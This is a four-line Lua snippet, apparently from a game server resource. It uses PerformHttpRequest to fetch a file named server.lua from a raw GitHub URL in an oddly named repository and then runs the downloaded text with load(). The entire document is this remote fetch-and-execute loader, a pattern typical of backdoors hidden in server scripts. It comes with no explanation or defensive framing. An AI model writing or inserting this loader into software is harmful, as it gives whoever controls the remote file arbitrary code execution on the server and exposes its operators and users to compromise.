PerformHttpRequest("https://raw.githubusercontent.com/DeJaVu888/Toxicy36yskin/master/server.lua", function(err, text, headers)
    assert(load(text))()
end, 'GET', '')
